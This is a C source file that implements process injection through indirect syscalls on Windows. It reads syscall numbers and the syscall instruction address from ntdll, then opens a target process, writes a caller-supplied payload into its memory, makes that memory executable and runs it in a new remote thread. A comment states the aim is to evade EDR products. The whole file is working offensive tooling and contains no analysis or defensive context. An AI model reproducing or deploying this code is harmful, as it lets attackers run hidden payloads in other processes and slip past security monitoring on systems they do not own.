#include "Mylib.h"



VOID IndirectPrelude(
    _In_  HMODULE NtdllHandle,
    _In_  LPCSTR NtFunctionName,
    _Out_ PDWORD NtFunctionSSN
   
) {

    DWORD SyscallNumber = 0;
    UINT_PTR NtFunctionAddress = 0;
    UCHAR SyscallOpcodes[2] = { 0x0F, 0x05 };

    NtFunctionAddress = (UINT_PTR)GetProcAddress(NtdllHandle, NtFunctionName);
    if (0 == NtFunctionAddress) {
        WARN("[GetProcAddress] failed, error: 0x%lx", GetLastError());
        return;
    }

    *NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 0x4))[0];
 

  

}
/* we used only one variable of Mysyscall because the syscall adresse is the same in all fucntions */
/*This function will get the adresse of instruction syscall to jump into it to evade EDRs*/

VOID initialiseSyscallcode(
    _In_  HMODULE NtdllHandle,
    _In_  LPCSTR NtFunctionName,
    _Out_ PUINT_PTR NtFunctionSyscall) {

    DWORD SyscallNumber = 0;
    UINT_PTR NtFunctionAddress = 0;
    UCHAR SyscallOpcodes[2] = { 0x0F, 0x05 };

    NtFunctionAddress = (UINT_PTR)GetProcAddress(NtdllHandle, NtFunctionName);
    if (0 == NtFunctionAddress) {
        WARN("[GetProcAddress] failed, error: 0x%lx", GetLastError());
        return;
    }

    
    *NtFunctionSyscall = NtFunctionAddress + 0x12;

   
    if (memcmp(SyscallOpcodes, (PVOID)*NtFunctionSyscall, sizeof(SyscallOpcodes)) == 0) {
        INFO("[0x%p] [0x%p] -> %s", (PVOID)NtFunctionAddress, (PVOID)*NtFunctionSyscall, NtFunctionName);
        return;
    }

    else {
        WARN("expected syscall signature: \"0x0f05\" didn't match.");
        return;
    }
    


}

BOOL IndirectSyscallsInjection(
    _In_ CONST DWORD PID,
    _In_ CONST PBYTE Payload,
    _In_ CONST SIZE_T PayloadSize
) {

    BOOL      State = TRUE;
    PVOID     Buffer = NULL;
    HANDLE    ThreadHandle = NULL;
    HANDLE    ProcessHandle = NULL;
    HMODULE   NtdllHandle = NULL;
    DWORD     OldProtection = 0;
    SIZE_T    BytesWritten = 0;
    NTSTATUS  Status = 0;
    CLIENT_ID CID = { (HANDLE)PID, NULL };
    OBJECT_ATTRIBUTES OA = { sizeof(OA),  NULL };

    NtdllHandle = GetModuleHandleW(L"NTDLL");
    if (NULL == NtdllHandle) {
        WARN("[GetModuleHandleW] failed, error: 0x%lx", GetLastError());
        return FALSE;
    }
    OKAY("[0x%p] got the address of NTDLL!", NtdllHandle);

    /* we used only one variable of Mysyscall because the syscall adresse is the same in all fucntions */

    initialiseSyscallcode(NtdllHandle, "NtOpenProcess", &g_Mysyscall);  /*Here Jabna the adress of syscall instr*/

    /*Here we bring the SSN of each function */
    
   
    IndirectPrelude(NtdllHandle, "NtOpenProcess", &g_NtOpenProcessSSN); 
    IndirectPrelude(NtdllHandle, "NtAllocateVirtualMemory", &g_NtAllocateVirtualMemorySSN);
    IndirectPrelude(NtdllHandle, "NtWriteVirtualMemory", &g_NtWriteVirtualMemorySSN);
    IndirectPrelude(NtdllHandle, "NtProtectVirtualMemory", &g_NtProtectVirtualMemorySSN);
    IndirectPrelude(NtdllHandle, "NtCreateThreadEx", &g_NtCreateThreadExSSN);
    IndirectPrelude(NtdllHandle, "NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN);
    IndirectPrelude(NtdllHandle, "NtFreeVirtualMemory", &g_NtFreeVirtualMemorySSN );
    IndirectPrelude(NtdllHandle, "NtClose", &g_NtCloseSSN);

    Status = NtOpenProcess(&ProcessHandle, PROCESS_ALL_ACCESS, &OA, &CID);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtOpenProcess", Status);
        return FALSE; /* no point in continuing if we can't even get a handle on the process */
    }
    OKAY("[0x%p] got a handle on the process (%ld)!", ProcessHandle, PID);

    Status = NtAllocateVirtualMemory(ProcessHandle, &Buffer, 0, &PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtAllocateVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [RW-] allocated a %zu-byte buffer with PAGE_READWRITE [RW-] permissions!", Buffer, PayloadSize);

    Status = NtWriteVirtualMemory(ProcessHandle, Buffer, Payload, PayloadSize, &BytesWritten);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtWriteVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [RW-] wrote %zu-bytes to the allocated buffer!", Buffer, BytesWritten);

    Status = NtProtectVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, PAGE_EXECUTE_READ, &OldProtection);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtProtectVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [R-X] changed allocated buffer protection to PAGE_EXECUTE_READ [R-X]!", Buffer);

    Status = NtCreateThreadEx(&ThreadHandle, THREAD_ALL_ACCESS, &OA, ProcessHandle, Buffer, NULL, FALSE, 0, 0, 0, NULL);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtCreateThreadEx", Status);
        State = FALSE; goto CLEANUP;
    }

    OKAY("[0x%p] successfully created a thread!", ThreadHandle);
    INFO("[0x%p] waiting for thread to finish execution...", ThreadHandle);
    Status = NtWaitForSingleObject(ThreadHandle, FALSE, NULL);
    INFO("[0x%p] thread finished execution! beginning cleanup...", ThreadHandle);

CLEANUP:

    if (Buffer) {
        Status = NtFreeVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, MEM_DECOMMIT);
        if (STATUS_SUCCESS != Status) {
            PRINT_ERROR("NtFreeVirtualMemory", Status);
        }
        else {
            INFO("[0x%p] decommitted allocated buffer from process memory", Buffer);
        }
    }

    if (ThreadHandle) {
        NtClose(ThreadHandle);
        INFO("[0x%p] handle on thread closed", ThreadHandle);
    }

    if (ProcessHandle) {
        NtClose(ProcessHandle);
        INFO("[0x%p] handle on process closed", ProcessHandle);
    }

    return State;

}